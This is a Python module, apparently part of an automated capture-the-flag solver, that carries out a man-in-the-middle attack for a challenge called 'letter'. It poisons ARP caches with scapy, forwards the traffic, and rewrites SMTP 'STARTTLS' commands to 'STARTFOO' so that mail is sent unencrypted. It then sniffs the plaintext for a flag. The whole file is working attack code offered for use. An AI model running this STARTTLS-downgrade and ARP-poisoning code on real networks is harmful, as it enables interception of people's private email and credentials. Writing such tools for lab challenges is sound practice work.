# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re

logger = logging.getLogger(__name__)

class CorruptTlsStrategy(strategy.Strategy):
    """
    CorruptTlsStrategy solves the "letter" challenge by executing a MITM attack and corrupting the STARTTLS command.
    The is accomplished by replacing 'STARTTLS' with 'STARTFOO' when sent to the server. The server will respond with
    and error and the client will continue without encryption. The flag is in the emails.
    """
    needsip = True
    challenges = ['letter']

    class AnalysisModule(capture.Module):
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.flag = None
            self.sniffer = None

        def start(self, sniffer):
            self.sniffer = sniffer

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
                logger.debug(pkt.sprintf('%IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %Raw.load%'))

                try:
                    load = pkt.load.decode('utf-8')
                except DecodeError:
                    return

                m = re.search(self.flagpattern, load)
                if m:
                    self.flag = m.group(0)
                    self.sniffer.stop()

    @staticmethod
    def corrupttls(pkt):
        if all(layer in pkt for layer in (scapy.IP, scapy.TCP, scapy.Raw)):
            if pkt[scapy.TCP].dport == 25 and b'STARTTLS' in pkt[scapy.Raw].load:
                pkt.load = pkt[scapy.Raw].load.replace(b'STARTTLS', b'STARTFOO')

                # Delete the checksums. Scapy will recalculate them on send.
                del pkt[scapy.IP].chksum
                del pkt[scapy.TCP].chksum
        return pkt
        

    def execute(self, iface, flagpattern, canceltoken=None):
        sniffer = capture.Sniffer(iface=iface)
        cachemod = capture.ArpCacheModule()
        analyser = self.AnalysisModule(flagpattern)
        sniffer.register(
            cachemod,
            analyser,
            capture.ArpPoisonerModule(cachemod.cache),
            capture.ForwarderModule(cachemod.cache, filter=self.corrupttls),
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return analyser.flag
